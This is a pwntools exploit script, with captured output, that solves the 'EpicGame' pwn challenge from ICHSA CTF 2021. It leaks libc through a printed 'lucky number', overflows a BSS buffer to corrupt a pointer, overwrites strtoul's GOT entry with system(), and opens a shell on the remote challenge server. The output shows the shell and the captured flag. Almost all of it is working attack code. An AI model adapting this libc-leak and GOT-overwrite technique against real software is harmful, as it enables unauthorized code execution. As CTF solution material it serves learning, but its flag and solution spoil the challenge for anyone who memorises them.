#!/usr/bin/env python3
from pwn import *
context.log_level = 'error'
chall        = context.binary = ELF('./app.out')
LIBC_PATH    =  ''
DEFAULT_PATH = '/usr/lib/x86_64-linux-gnu/libc-2.31.so'


def start(argv=[], *a, **kw):
    global LIBC_PATH, DEFAULT_PATH
    if args.GDB:
        LIBC_PATH = DEFAULT_PATH
        return gdb.debug([chall.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        LIBC_PATH = './libc6_2.28-10_amd64.so'
        return remote('epic_game.ichsa.ctf.today', 8007)
    else:
        LIBC_PATH = DEFAULT_PATH
        return process([chall.path] + argv, *a, **kw)

# for local debugging purposes, run the script with `GDB` argument 
gdbscript = '''
break *0x401392
condition 1 (int)$rsi <= 0x7
continue
'''.format(**locals())


# utils funcs
def waitforchoice(io):
    io.recvuntil(b'Choice:')
    return 0

def fill_bss_buff(io):
    waitforchoice(io)
    io.sendline(b'A'*0x3fe)
    waitforchoice(io)
    io.sendline(b'B'*0x2)
    return 0

def setup_player(io):
    io.sendline(b'1')       # mighty warrior
    waitforchoice(io)
    io.sendline(b'pwnie')   # player's name
    return fetch_libc_leak(io)

def fetch_libc_leak(io):
    io.recvuntil(b'Your lucky number is ')
    rand_leak = int(io.recvuntil(b'\n')[:-1])
    return rand_leak


def fetch_system(libc_leak):
    global LIBC_PATH
    libc = ELF(LIBC_PATH)
    libc_base = libc_leak - libc.sym['rand']
    retval = libc_base + libc.sym['system']

    return retval

# main 
io       = start()
rnd_leak = setup_player(io)
systm    = fetch_system(rnd_leak)

print('libc leak :: ', hex(rnd_leak))
print('system :: ' , hex(systm))

print('hot-patching `curr` to create a write primitive')
fill_bss_buff(io)       # adjusting `curr` over 0x400
payload  = b'woaaah'    # fixing alignment and reaching `cur` in memory
payload += p64(0xffffffffffffffa9) # setting `cur` to create a write primitive on the GOT, 
                                   # specifically on strtoul@GLIBC_2.2.5, which is located at [0x404078] 
waitforchoice(io)
io.sendline(payload)

print('Overriding strtoul@GLIBC with system()')
io.sendline(p64(systm))

waitforchoice(io)
io.sendline(b'echo gotit && /bin/sh')
io.recvuntil(b'gotit')
io.interactive()



# output:
# root@56bec2e1a941:~/host-share/ICHSA-CTF-2021/pwn/EpicGame/ctfd# ./solve.py REMOTE
# libc leak ::  0x7f11e93b7ef0
# system ::  0x7f11e93c19c0
# hot-patching `curr` to create a write primitive
# Overriding strtoul@GLIBC with system()
#
# $ ls
# app.out  flag.txt
# $ cat flag.txt
# ICHSA_CTF{Th3_cyb3r_5p1r1t_0f_luck_I5_s7r0ng_w17h_y0u}$
# $ exit
# Input Error
